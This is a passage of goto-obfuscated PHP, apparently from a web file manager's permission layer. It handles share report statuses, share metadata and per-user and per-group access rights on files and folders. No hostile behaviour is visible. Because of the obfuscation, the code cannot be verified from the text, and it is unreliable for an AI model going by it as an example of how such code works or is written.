in_array($eì®ÃÑš‰è[$bãôğÏÁµ•[714]], array($bãôğÏÁµ•[493], $bãôğÏÁµ•[93], $bãôğÏÁµ•[1779], $bãôğÏÁµ•[1780]))) { $FŒÒÕï†Öò[$bãôğÏÁµ•[714]] = $eì®ÃÑš‰è[$bãôğÏÁµ•[714]]; } $cÊİ¦ªÓøÆ = Input::get($bãôğÏÁµ•[432], $bãôğÏÁµ•[7], $bãôğÏÁµ•[1778], array($bãôğÏÁµ•[1703], $bãôğÏÁµ•[428])); goto F£Ø³ƒ¼; fÃÀ‘±ğŠç: $bãôğÏÁµ• =& $_SERVER[±á õÁ]; $FŒÒÕï†Öò = array(); if ($eì®ÃÑš‰è[$bãôğÏÁµ•[727]]) { $d±…Ø¤ë¸ˆ = $eì®ÃÑš‰è[$bãôğÏÁµ•[472]] ? $eì®ÃÑš‰è[$bãôğÏÁµ•[472]] : strtotime(date($bãôğÏÁµ•[1776])); $FŒÒÕï†Öò[$bãôğÏÁµ•[200]] = array($bãôğÏÁµ•[336], array($eì®ÃÑš‰è[$bãôğÏÁµ•[727]], $d±…Ø¤ë¸ˆ)); } goto F„ˆ·±«Ã‘; cŒì¾Ÿ¼ÅØ: } public function reportStatus($cëÅ»ò³éî) { goto c·ñ‘–„¡¼; A‹½Õ™è–œ: return $fŞ£Ò¹ Û‰; goto FŞƒ¯‹¨Œ¨; c·ñ‘–„¡¼: $a«¶É•æ… =& $_SERVER[±á õÁ]; $Eƒ Ğ»¯˜ = array($a«¶É•æ…[391] => $cëÅ»ò³éî[$a«¶É•æ…[391]]); $c¾éÍ…­í = Model($a«¶É•æ…[1774])->where($Eƒ Ğ»¯˜)->field($a«¶É•æ…[1784])->find(); goto F‚æâÌÎ˜œ; F‚æâÌÎ˜œ: if (!$c¾éÍ…­í) { return !1; } $d†Š§¹•‚ = array($a«¶É•æ…[714] => $cëÅ»ò³éî[$a«¶É•æ…[714]]); if ($cëÅ»ò³éî[$a«¶É•æ…[714]] == $a«¶É•æ…[1780] && $c¾éÍ…­í[$a«¶É•æ…[714]] == $a«¶É•æ…[1780]) { $d†Š§¹•‚[$a«¶É•æ…[714]] = 0; } goto Eì…¾Á³ÄÌ; Eì…¾Á³ÄÌ: $fŞ£Ò¹ Û‰ = Model($a«¶É•æ…[1774])->where($Eƒ Ğ»¯˜)->save($d†Š§¹•‚); if ($cëÅ»ò³éî[$a«¶É•æ…[714]] == $a«¶É•æ…[1779]) { if ($c¾éÍ…­í[$a«¶É•æ…[443]] != $a«¶É•æ…[493] && $this->shareFileMeta($c¾éÍ…­í[$a«¶É•æ…[443]])) { $this->shareFileMeta($c¾éÍ…­í[$a«¶É•æ…[443]], 0); } $this->remove($c¾éÍ…­í[$a«¶É•æ…[464]]); return !0; } if ($fŞ£Ò¹ Û‰ && $cëÅ»ò³éî[$a«¶É•æ…[714]] == $a«¶É•æ…[1780]) { $eÍ»Ã«‹± = $d†Š§¹•‚[$a«¶É•æ…[714]] == $a«¶É•æ…[1780] ? 1 : 0; $this->shareFileMeta($c¾éÍ…­í[$a«¶É•æ…[443]], $eÍ»Ã«‹±); $this->removeByFile($c¾éÍ…­í[$a«¶É•æ…[443]]); } goto A‹½Õ™è–œ; FŞƒ¯‹¨Œ¨: } private function removeByFile($c††‹Úíé‰) { goto BÍÄÂãœÀè; E›µ„ÊÃË: $B‘¥‹­—š™ = array($FÏ¾”„ççÏ[393] => array($FÏ¾”„ççÏ[7], $bñ–Æ­³´ç), $FÏ¾”„ççÏ[469] => 1); $a¸‘ª¬á¸ = Model($FÏ¾”„ççÏ[1598])->where($B‘¥‹­—š™)->field($FÏ¾”„ççÏ[464])->select(); if (empty($a¸‘ª¬á¸)) { return; } goto cåĞ·åí±À; BÍÄÂãœÀè: $FÏ¾”„ççÏ =& $_SERVER[±á õÁ]; $a¸‘ª¬á¸ = Model($FÏ¾”„ççÏ[776])->where(array($FÏ¾”„ççÏ[443] => $c††‹Úíé‰))->field($FÏ¾”„ççÏ[393])->select(); $bñ–Æ­³´ç = array_to_keyvalue($a¸‘ª¬á¸, $FÏ¾”„ççÏ[43], $FÏ¾”„ççÏ[393]); goto E›µ„ÊÃË; cåĞ·åí±À: $A±Ãáù…¥¬ = array_to_keyvalue($a¸‘ª¬á¸, $FÏ¾”„ççÏ[43], $FÏ¾”„ççÏ[464]); $this->remove($A±Ãáù…¥¬); goto c“–…Ï£¢ç; c“–…Ï£¢ç: } private function shareFileMeta($câšºëâ½, $C˜ÕéòÁ”¡ = null) { $a“ìšÀ•Ò =& $_SERVER[±á õÁ]; $Dëø™Á×† = array($a“ìšÀ•Ò[443] => $câšºëâ½, $a“ìšÀ•Ò[99] => $a“ìšÀ•Ò[1785]); if (is_null($C˜ÕéòÁ”¡)) { return Model($a“ìšÀ•Ò[1786])->where($Dëø™Á×†)->find(); } $Dëø™Á×†[$a“ìšÀ•Ò[375]] = $C˜ÕéòÁ”¡; Model($a“ìšÀ•Ò[1786])->add($Dëø™Á×†, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\x63\145\x5f\141\x75\x74\150"; public function getAuth($BÂÂƒ‘¿‚Ê) { goto B¡‡¶–Ä Š; B¡‡¶–Ä Š: $DŠ‹®Ò×Õ  =& $_SERVER[±á õÁ]; $BÊŸ¾Ñ“ê‹ = $DŠ‹®Ò×Õ [1787]; $cæ‰®½«¶¢ = array($DŠ‹®Ò×Õ [393] => $BÂÂƒ‘¿‚Ê); goto Có‹Ê÷Ò«Ú; b»íÄ‰æŞ: $DÖå©éÎÊ = 2 << 25; foreach ($DÈ·Åå¡›» as $fÍ”‰êîÛ‡) { goto BñÚ§Ùß‹½; cÒŞŠï£©ñ: $d¶“È’ÔÌ¿ = 0; if ($fÍ”‰êîÛ‡[$DŠ‹®Ò×Õ [395]] == SourceModel::TYPE_GROUP) { $d¶“È’ÔÌ¿ = $DÖå©éÎÊ * 2; } if ($fÍ”‰êîÛ‡[$DŠ‹®Ò×Õ [395]] == SourceModel::TYPE_USER) { $d¶“È’ÔÌ¿ = $DÖå©éÎÊ; } goto aÒ•‡´Í×ç; aÒ•‡´Í×ç: if ($fÍ”‰êîÛ‡[$DŠ‹®Ò×Õ [395]] == SourceModel::TYPE_USER && $fÍ”‰êîÛ‡[$DŠ‹®Ò×Õ [481]] == $DŠ‹®Ò×Õ [493]) { $d¶“È’ÔÌ¿ = 0; } $F¬Ò¶”¸à¦[] = $EíğÍ£ŸÏ[$DŠ‹®Ò×Õ [400]] + $d¶“È’ÔÌ¿; goto bø»šŞ­ŸØ; BñÚ§Ùß‹½: $EíğÍ£ŸÏ = Model($DŠ‹®Ò×Õ [1788])->listData($fÍ”‰êîÛ‡[$DŠ‹®Ò×Õ [1768]]); if (!$EíğÍ£ŸÏ) { continue; } $E’º˜ÈĞÄ[] = $fÍ”‰êîÛ‡; goto cÒŞŠï£©ñ; bø»šŞ­ŸØ: } array_multisort($F¬Ò¶”¸à¦, SORT_DESC, $E’º˜ÈĞÄ); goto Fò©±…¸ÉÏ; Fò©±…¸ÉÏ: return $E’º˜ÈĞÄ; goto fôğ±è×Ì–; Có‹Ê÷Ò«Ú: $DÈ·Åå¡›» = $this->field($BÊŸ¾Ñ“ê‹)->order($DŠ‹®Ò×Õ [391])->where($cæ‰®½«¶¢)->select(); $E’º˜ÈĞÄ = array(); $F¬Ò¶”¸à¦ = array(); goto b»íÄ‰æŞ; fôğ±è×Ì–: } public function setAuth($d·®•Ü¾ÈÎ, $dÔ‡±ÅïïÆ) { goto A°×è½“; A°×è½“: $AŠ¯»„½† =& $_SERVER[±á õÁ]; $c¨Ú„¦ğë = Model($AŠ¯»„½†[1138])->sourceInfo($d·®•Ü¾ÈÎ); if (!$c¨Ú„¦ğë) { return !1; } goto b£„º¨Ó™¿; e¦ğğ·…á½: if ($Bõ¯íÆš¾ã != $f°Î¸ğÍÚ‰) { $bªî–áÏ±÷ = array($AŠ¯»„½†[1621] => $Bõ¯íÆš¾ã); $F‹•Äâ²†ö = Model($AŠ¯»„½†[1702])->field($AŠ¯»„½†[1463])->where($bªî–áÏ±÷)->select(); $F‹•Äâ²†ö = array_to_keyvalue($F‹•Äâ²†ö, $AŠ¯»„½†[43], $AŠ¯»„½†[1463]); } $e„Ä¸ì¥ã = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $cª¹¯‘‹ˆŒ = array(); goto AÈ°—£³Ç‡; b£„º¨Ó™¿: if ($c¨Ú„¦ğë[$AŠ¯»„½†[395]] != SourceModel::TYPE_GROUP) { return !1; } $f°Î¸ğÍÚ‰ = 1; $Bõ¯íÆš¾ã = $c¨Ú„¦ğë[$AŠ¯»„½†[481]]; goto e¦ğğ·…á½; AÈ°—£³Ç‡: foreach ($dÔ‡±ÅïïÆ as $f¯¦İŠãÚ‡) { if (!in_array($f¯¦İŠãÚ‡[$AŠ¯»„½†[395]], $e„Ä¸ì¥ã)) { show_json(LNG($AŠ¯»„½†[1789]), !1); } if ($Bõ¯íÆš¾ã != $f°Î¸ğÍÚ‰) { if ($f¯¦İŠãÚ‡[$AŠ¯»„½†[395]] == SourceModel::TYPE_GROUP) { } if ($f¯¦İŠãÚ‡[$AŠ¯»„½†[481]] != 0 && !in_array($f¯¦İŠãÚ‡[$AŠ¯»„½†[481]], $F‹•Äâ²†ö)) { } } if ($f¯¦İŠãÚ‡[$AŠ¯»„½†[481]] == 0) { $f¯¦İŠãÚ‡[$AŠ¯»„½†[395]] = SourceModel::TYPE_USER; } $cª¹¯‘‹ˆŒ[] = array($AŠ¯»„½†[393] => $d·®•Ü¾ÈÎ, $AŠ¯»„½†[395] => intval($f¯¦İŠãÚ‡[$AŠ¯»„½†[395]]), $AŠ¯»„½†[481] => intval($f¯¦İŠãÚ‡[$AŠ¯»„½†[481]]), $AŠ¯»„½†[1768] => intval($f¯¦İŠãÚ‡[$AŠ¯»„½†[1768]]) ? intval($f¯¦İŠãÚ‡[$AŠ¯»„½†[1768]]) : 0, $AŠ¯»„½†[1769] => intval($f¯¦İŠãÚ‡[$AŠ¯»„½†[1769]]) ? intval($f¯¦İŠãÚ‡[$AŠ¯»„½†[1769]]) : -1); } $this->where(array($AŠ¯»„½†[407] => $d·®•Ü¾ÈÎ))->delete(); $this->addAll($cª¹¯‘‹ˆŒ); goto B¼’â˜¹ù‚; B¼’â˜¹ù‚: return !0; goto c–í­•†…‘; c–í­•†…‘: } public function authClear($AÀ£ãÖ¹¸ë) { $DŠÊ÷Ñ²ë… =& $_SERVER[±á õÁ]; $dóø‡å™Á‹ = Model($DŠÊ÷Ñ²ë…[1138])->sourceInfo($AÀ£ãÖ¹¸ë); $fêòÀíè Ø = array($AÀ£ãÖ¹¸ë); if ($dóø‡å™Á‹[$DŠÊ÷Ñ²ë…[394]] == $DŠÊ÷Ñ²ë…[93]) { $EªÀá–Ğ‹¡ = array($DŠÊ÷Ñ²ë…[550] => array($DŠÊ÷Ñ²ë…[508], $dóø‡å™Á‹[$DŠÊ÷Ñ²ë…[484]] . $AÀ£ãÖ¹¸ë . $DŠÊ÷Ñ²ë…[509])); $fêòÀíè Ø = Model($DŠÊ÷Ñ²ë…[1138])->field($DŠÊ÷Ñ²ë…[407])->where($EªÀá–Ğ‹¡)->getField($DŠÊ÷Ñ²ë…[393], !0); $fêòÀíè Ø[] = $AÀ£ãÖ¹¸ë; } $this->where(array($DŠÊ÷Ñ²ë…[407] => array($DŠÊ÷Ñ²ë…[408], $fêòÀíè Ø)))->delete(); return !0; } public function getAllChildren($F²½Ô½¢‹Î) { goto B¿’„àÜ¦»; DÚ¶Æ­˜—: return $this->sourceListAuth($E´Ş˜äó¬¥); goto Dµî¹ìŠµº; d”‹°ò¬†: $BØ¶Óè˜³Ø = Model($FŸ÷††Ÿ[776])->field($A–ìÔ„…âÇ)->where($aÑˆ•‡ÆÌ)->select(); $E´Ş˜äó¬¥ = array($F²½Ô½¢‹Î); foreach ($BØ¶Óè˜³Ø as $fè–â³Ê©) { foreach ($a´ìßŒ ‰Ê as $e£é¼ç‰Å) { $dí„ß½…‹§ = $FŸ÷††Ÿ[57] . $e£é¼ç‰Å . $FŸ÷††Ÿ[57]; $C¡ÚÛ‹½éÀ = $fè–â³Ê©[$FŸ÷††Ÿ[484]] . $fè–â³Ê©[$FŸ÷††Ÿ[393]] . $FŸ÷††Ÿ[57]; if (strstr($C¡ÚÛ‹½éÀ, $dí„ß½…‹§)) { $E´Ş˜äó¬¥[] = $fè–â³Ê©[$FŸ÷††Ÿ[393]]; break; } } } goto DÚ¶Æ­˜—; C“Í¶½‡‹†: if (!$bç‡¡ÅÇãë) { return array(); } $A–ìÔ„…âÇ = $FŸ÷††Ÿ[1790]; $aÑˆ•‡ÆÌ = array($FŸ÷††Ÿ[393] => array($FŸ÷††Ÿ[7], $bç‡¡ÅÇãë), $FŸ÷††Ÿ[421] => $FŸ÷††Ÿ[493]); goto d”‹°ò¬†; c¢º†½À—: if ($AßÄ£Á¯îÜ[$FŸ÷††Ÿ[486]] == $FŸ÷††Ÿ[493] && $AßÄ£Á¯îÜ[$FŸ÷††Ÿ[481]] != $dÑÍ–òù™‚) { $a´ìßŒ ‰Ê = $this->groupChidldAllRootSource($AßÄ£Á¯îÜ[$FŸ÷††Ÿ[481]]); } $bç‡¡ÅÇãë = $this->field($FŸ÷††Ÿ[393])->group($FŸ÷††Ÿ[393])->select(); $bç‡¡ÅÇãë = array_to_keyvalue($bç‡¡ÅÇãë, $FŸ÷††Ÿ[43], $FŸ÷††Ÿ[393]); goto C“Í¶½‡‹†; B¿’„àÜ¦»: $FŸ÷††Ÿ =& $_SERVER[±á õÁ]; $AßÄ£Á¯îÜ = Model($FŸ÷††Ÿ[1138])->sourceInfo($F²½Ô½¢‹Î); if ($AßÄ£Á¯îÜ[$FŸ÷††Ÿ[394]] != $FŸ÷††Ÿ[93]) { return $this->sourceListAuth(array($F²½Ô½¢‹Î)); } goto aë“»ç–ì; aë“»ç–ì: if ($AßÄ£Á¯îÜ[$FŸ÷††Ÿ[395]] != SourceModel::TYPE_GROUP) { return array(); } $dÑÍ–òù™‚ = 1; $a´ìßŒ ‰Ê = array($F²½Ô½¢‹Î); goto c¢º†½À—; Dµî¹ìŠµº: } private function sourceListAuth($CÁòÆØ”Õ†) { goto AÈÒÁ¹øòî; AÈÒÁ¹øòî: $aë£ä¤±Ù =& $_SERVER[±á õÁ]; $f«Åæ½Á‰ = Model($aë£ä¤±Ù[1138])->sourceListInfo($CÁòÆØ”Õ†, !0); $d‡Øï¾×“À = $aë£ä¤±Ù[1787]; goto dåó¡‘õÃ²; c£´ÓºÛâÛ: $AØ´À×õİƒ = array(); foreach ($f«Åæ½Á‰ as $Aø™š½Ú) { goto D¶çÓ¬¯Ì¨; aí÷È—¥™Í: $C§ÌŠÏ¥ = count(explode($aë£ä¤±Ù[8], trim($Aø™š½Ú[$aë£ä¤±Ù[491]], $aë£ä¤±Ù[8]))); $AØ´À×õİƒ[] = $C§ÌŠÏ¥ + ($Aø™š½Ú[$aë£ä¤±Ù[39]] == $aë£ä¤±Ù[86] ? 0 : 1000); goto c±ˆ÷ñŸ; E¨´èœâÈ: $Aø™š½Ú[$aë£ä¤±Ù[1791]] = $this->authTargetInfo($A¼¡‘ßÏØ); $Aø™š½Ú[$aë£ä¤±Ù[491]] = rtrim($Aø™š½Ú[$aë£ä¤±Ù[487]], $aë£ä¤±Ù[8]) . $aë£ä¤±Ù[8] . ltrim($Aø™š½Ú[$aë£ä¤±Ù[491]], $aë£ä¤±Ù[8]); $FŞÛ…¿›š[] = $Aø™š½Ú; goto aí÷È—¥™Í; d‘Ç„œ±: unset($Aø™š½Ú[$aë£ä¤±Ù[415]]); $A¼¡‘ßÏØ = $B»¾ÒÙ§Œ²[$Aø™š½Ú[$aë£ä¤±Ù[393]]]; if (!$A¼¡‘ßÏØ) { continue; } goto E¨´èœâÈ; D¶çÓ¬¯Ì¨: unset($Aø™š½Ú[$aë£ä¤±Ù[403]]); unset($Aø™š½Ú[$aë£ä¤±Ù[402]]); unset($Aø™š½Ú[$aë£ä¤±Ù[400]]); goto d‘Ç„œ±; c±ˆ÷ñŸ: } array_multisort($AØ´À×õİƒ, SORT_ASC, $FŞÛ…¿›š); goto c İà¾»³; c İà¾»³: return $FŞÛ…¿›š; goto døËÎÇ—œÂ; dåó¡‘õÃ²: $A§ôæë‚¾ğ = $this->field($d‡Øï¾×“À)->where(array($aë£ä¤±Ù[393] => array($aë£ä¤±Ù[7], $CÁòÆØ”Õ†)))->select(); $B»¾ÒÙ§Œ² = array_to_keyvalue_group($A§ôæë‚¾ğ, $aë£ä¤±Ù[393]); $FŞÛ…¿›š = array(); goto c£´ÓºÛâÛ; døËÎÇ—œÂ: } private function groupChidldAllRootSource($còË¬èÉÊÙ) { $c¢ò¥‡¶¶õ =& $_SERVER[±á õÁ]; $e£ã¿¯Û¶ = Model($c¢ò¥‡¶¶õ[1792])->groupChildrenAll($còË¬èÉÊÙ); $Cì‹´ŞÚªâ = array($c¢ò¥‡¶¶õ[486] => 0, $c¢ò¥‡¶¶õ[481] => array($c¢ò¥‡¶¶õ[7], $e£ã¿¯Û¶), $c¢ò¥‡¶¶õ[395] => SourceModel::TYPE_GROUP); $DˆĞ†Ş¼‰ = Model($c¢ò¥‡¶¶õ[776])->field($c¢ò¥‡¶¶õ[393])->where($Cì‹´ŞÚªâ)->select(); $DˆĞ†Ş¼‰ = array_to_keyvalue($DˆĞ†Ş¼‰, $c¢ò¥‡¶¶õ[43], $c¢ò¥‡¶¶õ[393]); return $DˆĞ†Ş¼‰; } private function authTargetInfo($AÎ»ÔÂ£ÜÒ) { goto Aãª¤¬Àò·; Aãª¤¬Àò·: $d‰ä©œ’–× =& $_SERVER[±á õÁ]; $d…ä‘³¾÷ä = array(); $D‰Ó—„Êˆ = array(); goto D·ºæî¾µ; D·ºæî¾µ: $BåÚ°ªé‡´ = 2 << 25; foreach ($AÎ»ÔÂ£ÜÒ as $eÆÆ‚ÏÃ¥×) { goto D¦—ÆÑ†‹“; c¹†½Æ•å®: if (!$A©éœ®‹—) { continue; } $A©éœ®‹—[$d‰ä©œ’–×[442]] = $dœØ‡™ÆŒô; $d…ä‘³¾÷ä[] = $A©éœ®‹—; goto aàÜÎ…ºÈ; bµÏ¹‰ÎòÅ: if ($eÆÆ‚ÏÃ¥×[$d‰ä©œ’–×[395]] == SourceModel::TYPE_USER && $eÆÆ‚ÏÃ¥×[$d‰ä©œ’–×[481]] == $d‰ä©œ’–×[493]) { $Bë“Â©Ôä = 0; } $D‰Ó—„Êˆ[] = $dœØ‡™ÆŒô[$d‰ä©œ’–×[400]] + $Bë“Â©Ôä; goto bøš—Ÿ; D¦—ÆÑ†‹“: $dœØ‡™ÆŒô = Model($d‰ä©œ’–×[1788])->listData($eÆÆ‚ÏÃ¥×[$d‰ä©œ’–×[1768]]); if (!$dœØ‡™ÆŒô) { continue; } if ($eÆÆ‚ÏÃ¥×[$d‰ä©œ’–×[395]] == SourceModel::TYPE_USER) { $A©éœ®‹— = Model($d‰ä©œ’–×[499])->getInfoSimpleOuter($eÆÆ‚ÏÃ¥×[$d‰ä©œ’–×[481]]); if ($A©éœ®‹—[$d‰ä©œ’–×[1463]] == $d‰ä©œ’–×[1053]) { continue; } if ($A©éœ®‹—[$d‰ä©œ’–×[1463]] == $d‰ä©œ’–×[493]) { $A©éœ®‹—[$d‰ä©œ’–×[38]] = LNG($d‰ä©œ’–×[1793]); } } else { $A©éœ®‹— = Model($d‰ä©œ’–×[483])->getInfoSimple($eÆÆ‚ÏÃ¥×[$d‰ä©œ’–×[481]]); } goto c¹†½Æ•å®; aàÜÎ…ºÈ: $Bë“Â©Ôä = 0; if ($eÆÆ‚ÏÃ¥×[$d‰ä©œ’–×[395]] == SourceModel::TYPE_GROUP) { $Bë“Â©Ôä = $BåÚ°ªé‡´ * 2; } if ($eÆÆ‚ÏÃ¥×[$d‰ä©œ’–×[395]] == SourceModel::TYPE_USER) { $Bë“Â©Ôä = $BåÚ°ªé‡´; } goto bµÏ¹‰ÎòÅ; bøš—Ÿ: } array_multisort($D‰Ó—„Êˆ, SORT_DESC, $d…ä‘³¾÷ä); goto aˆËÃøÁ˜; aˆËÃøÁ˜: return $d…ä‘³¾÷ä; goto FÛÕ×Ş; FÛÕ×Ş: } public function getAllChildrenByUser($dÓ£¬¾ƒØÃ, $f«ñ·«ëÙ‚) { goto BËœ’£¿­; CÑ›ˆŠ†Ö£: foreach ($DŒÓ’ÅÅ Ó as $E…êºéÉ¼Ì) { $bÚÖŒ¯¬ã² = !1; foreach ($E…êºéÉ¼Ì[$CØçó¿ìÎ[1791]] as $b¾œŒ…’·Í) { if ($b¾œŒ…’·Í[$CØçó¿ìÎ[1463]]) { if ($b¾œŒ…’·Í[$CØçó¿ìÎ[1463]] == $f«ñ·«ëÙ‚) { $bÚÖŒ¯¬ã² = !0; break; } } if ($b¾œŒ…’·Í[$CØçó¿ìÎ[1621]]) { if ($this->groupContainUser($b¾œŒ…’·Í[$CØçó¿ìÎ[1621]], $f«ñ·«ëÙ‚)) { $bÚÖŒ¯¬ã² = !0; break; } } } if ($bÚÖŒ¯¬ã²) { $BÖªÍŞ¥Ğ‰[] = $E…êºéÉ¼Ì; } $cÜš…•İœ® = $E…êºéÉ¼Ì[$CØçó¿ìÎ[393]]; if (isset($eõ£³ÑŒ¢[$cÜš…•İœ®])) { $E…êºéÉ¼Ì[$CØçó¿ìÎ[1791]][] = $eõ£³ÑŒ¢[$cÜš…•İœ®][0]; $eõ£³ÑŒ¢[$cÜš…•İœ®] = !1; } } $eõ£³ÑŒ¢ = array_filter(array_values($eõ£³ÑŒ¢)); $BÖªÍŞ¥Ğ‰ = array_merge($eõ£³ÑŒ¢, $BÖªÍŞ¥Ğ‰); goto B¼é´¾àÜº; dŒÉ‰º£ğ: $fõ»…ì¹äº = Model($CØçó¿ìÎ[1138])->sourceInfo($dÓ£¬¾ƒØÃ); $eõ£³ÑŒ¢ = array(); $BÉµŒÊ£ö = 1; goto E´åâ¬‘åõ; B¼é´¾àÜº: return $BÖªÍŞ¥Ğ‰; goto D…¨Ó¸ä‚™; E´åâ¬‘åõ: if ($fõ»…ì¹äº[$CØçó¿ìÎ[486]] == $CØçó¿ìÎ[493] && $fõ»…ì¹äº[$CØçó¿ìÎ[481]] != $BÉµŒÊ£ö && $this->groupContainUser($fõ»…ì¹äº[$CØçó¿ìÎ[481]], $f«ñ·«ëÙ‚)) { foreach ($fËµß®«¥‰[$CØçó¿ìÎ[1794]] as $a¡¸Ö—òÖ—) { $CïöÃô„•Û = Model($CØçó¿ìÎ[483])->getInfo($a¡¸Ö—òÖ—[$CØçó¿ìÎ[1621]]); $b¹Ã¼¾Ä˜ = Model($CØçó¿ìÎ[502])->getInfoSimpleOuter($f«ñ·«ëÙ‚); $b¹Ã¼¾Ä˜[$CØçó¿ìÎ[442]] = $a¡¸Ö—òÖ—[$CØçó¿ìÎ[400]]; if (Model($CØçó¿ìÎ[1788])->authCheckAction($a¡¸Ö—òÖ—[$CØçó¿ìÎ[400]][$CØçó¿ìÎ[400]], $CØçó¿ìÎ[1641])) { continue; } $D÷ñÕ‰²Ğø = array($CØçó¿ìÎ[38] => $CØçó¿ìÎ[1415] . $CïöÃô„•Û[$CØçó¿ìÎ[38]], $CØçó¿ìÎ[393] => $CïöÃô„•Û[$CØçó¿ìÎ[415]][$CØçó¿ìÎ[393]], $CØçó¿ìÎ[85] => KodIO::make($CïöÃô„•Û[$CØçó¿ìÎ[415]][$CØçó¿ìÎ[393]]), $CØçó¿ìÎ[486] => $CØçó¿ìÎ[493], $CØçó¿ìÎ[395] => $CØçó¿ìÎ[988], $CØçó¿ìÎ[39] => $CØçó¿ìÎ[513], $CØçó¿ìÎ[491] => $CïöÃô„•Û[$CØçó¿ìÎ[488]], $CØçó¿ìÎ[1621] => $CïöÃô„•Û[$CØçó¿ìÎ[1621]], $CØçó¿ìÎ[485] => $CïöÃô„•Û[$CØçó¿ìÎ[486]], $CØçó¿ìÎ[1791] => array($b¹Ã¼¾Ä˜)); $eõ£³ÑŒ¢[$D÷ñÕ‰²Ğø[$CØçó¿ìÎ[393]]] = $D÷ñÕ‰²Ğø; } } $BÖªÍŞ¥Ğ‰ = array(); $DŒÓ’ÅÅ Ó = $this->getAllChildren($dÓ£¬¾ƒØÃ); goto CÑ›ˆŠ†Ö£; BËœ’£¿­: $CØçó¿ìÎ =& $_SERVER[±á õÁ]; $fËµß®«¥‰ = Model($CØçó¿ìÎ[502])->getInfo($f«ñ·«ëÙ‚); if (!$f«ñ·«ëÙ‚ || !$dÓ£¬¾ƒØÃ || !$fËµß®«¥‰) { return array(); } goto dŒÉ‰º£ğ; D…¨Ó¸ä‚™: } public function setAllChildrenByUser($aŠÚ¤ÆéÀ¢, $A˜ºÆ‡¨ø, $DÅŠŠ÷¹Êö) { $eÎíáÅä„Š =& $_SERVER[±á õÁ]; $BáóÙ¤Óé« = $this->getAllChildrenByUser($aŠÚ¤ÆéÀ¢, $A˜ºÆ‡¨ø); if (!$DÅŠŠ÷¹Êö || !$BáóÙ¤Óé«) { return !1; } foreach ($BáóÙ¤Óé« as $cøÃ‡ó½Å¥) { $f§†‡±ÔÅî = array(); foreach ($cøÃ‡ó½Å¥[$eÎíáÅä„Š[1791]] as $BÄ¦È‚å•) { $C‹Šõ²Ã¾î = $BÄ¦È‚å•[$eÎíáÅä„Š[442]]; $EìÀÈÑçÚ = $BÄ¦È‚å•[$eÎíáÅä„Š[1463]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Bùâ‡Ä‰Ä“ = $BÄ¦È‚å•[$eÎíáÅä„Š[1463]] ? $BÄ¦È‚å•[$eÎíáÅä„Š[1463]] : $BÄ¦È‚å•[$eÎíáÅä„Š[1621]]; if ($BÄ¦È‚å•[$eÎíáÅä„Š[1463]] && $BÄ¦È‚å•[$eÎíáÅä„Š[1463]] == $A˜ºÆ‡¨ø) { continue; } $f§†‡±ÔÅî[] = array($eÎíáÅä„Š[393] => $cøÃ‡ó½Å¥[$eÎíáÅä„Š[393]], $eÎíáÅä„Š[395] => $EìÀÈÑçÚ, $eÎíáÅä„Š[481] => intval($Bùâ‡Ä‰Ä“), $eÎíáÅä„Š[1768] => isset($C‹Šõ²Ã¾î[$eÎíáÅä„Š[391]]) ? intval($C‹Šõ²Ã¾î[$eÎíáÅä„Š[391]]) : 0, $eÎíáÅä„Š[1769] => isset($C‹Šõ²Ã¾î[$eÎíáÅä„Š[1769]]) ? intval($C‹Šõ²Ã¾î[$eÎíáÅä„Š[1769]]) : -1); } $f§†‡±ÔÅî[] = array($eÎíáÅä„Š[393] => $cøÃ‡ó½Å¥[$eÎíáÅä„Š[393]], $eÎíáÅä„Š[395] => SourceModel::TYPE_USER, $eÎíáÅä„Š[481] => intval($A˜ºÆ‡¨ø), $eÎíáÅä„Š[1768] => intval($DÅŠŠ÷¹Êö), $eÎíáÅä„Š[1769] => -1); $this->where(array($eÎíáÅä„Š[407] => $cøÃ‡ó½Å¥[$eÎíáÅä„Š[393]]))->delete(); $this->addAll($f§†‡±ÔÅî); } return !0; } public function get($Cç—¹§§Ò§) { $d÷Ÿ¶¾ô†… = $this->getSourceList(array($Cç—¹§§Ò§), !0); return $d÷Ÿ¶¾ô†…[0]; } public function getSourceList($b–ğŠ©‚³³, $b­à°…Ş£‚ = false, $Eø®»Ëæ = false) { goto AÈ‚ç§ ªá; E«ï¿Î¹Ÿ³: if (!$b­à°…Ş£‚ && count($b–ğŠ©‚³³) == 1) { $b­à°…Ş£‚ = array(); $b­à°…Ş£‚[$b–ğŠ©‚³³[0]] = $Báãğáë¬Ø->sourceInfo($b–ğŠ©‚³³[0]); } if (!$b­à°…Ş£‚) { $f‹‹´£ Ìë = array($b•÷¥ï„©Ê[407] => array($b•÷¥ï„©Ê[408], $b–ğŠ©‚³³)); $b­à°…Ş£‚ = $Báãğáë¬Ø->field($b•÷¥ï„©Ê[1795])->where($f‹‹´£ Ìë)->select(); $b­à°…Ş£‚ = array_to_keyvalue($b­à°…Ş£‚, $b•÷¥ï„©Ê[393]); } $bõÛÅö…ĞŞ = $b–ğŠ©‚³³; goto Bñ˜‘ ŸõÆ; E¾Ó™©«’î: $DÓ—Ú‘óË‰ = $b•÷¥ï„©Ê[1796]; $f‹‹´£ Ìë = array($b•÷¥ï„©Ê[407] => array($b•÷¥ï„©Ê[408], $bõÛÅö…ĞŞ)); $FÂµ©ø¶© = $this->field($DÓ—Ú‘óË‰)->where($f‹‹´£ Ìë)->select(); goto C•íÙƒ“Í®; A™«½‚Ó‹: $aÜÏÛ‰÷Ó¢ = array(); foreach ($b­à°…Ş£‚ as $D¢ªòŠàºÔ => $CÍîœ…í­) { if ($E‘“¥“¤ø¿) { $aÜÏÛ‰÷Ó¢[$D¢ªòŠàºÔ] = $C¤åã˜ÜÚò; continue; } $aÜÏÛ‰÷Ó¢[$D¢ªòŠàºÔ] = $this->makeSourceAuth($CÍîœ…í­, $E÷¤¤­‚ÇÜ, $Eø®»Ëæ); } return $aÜÏÛ‰÷Ó¢; goto BÒ£ñÌïò’; d‡×Şƒƒó¼: $E‘“¥“¤ø¿ = $this->userIsRoot($Eø®»Ëæ); $Fíò‹ä×ÇÀ = AuthModel::authAll(); $C¤åã˜ÜÚò = array($b•÷¥ï„©Ê[401] => $Fíò‹ä×ÇÀ, $b•÷¥ï„©Ê[1797] => array($b•÷¥ï„©Ê[409] => 0, $b•÷¥ï„©Ê[1627] => $Fíò‹ä×ÇÀ, $b•÷¥ï„©Ê[410] => LNG($b•÷¥ï„©Ê[1798]), 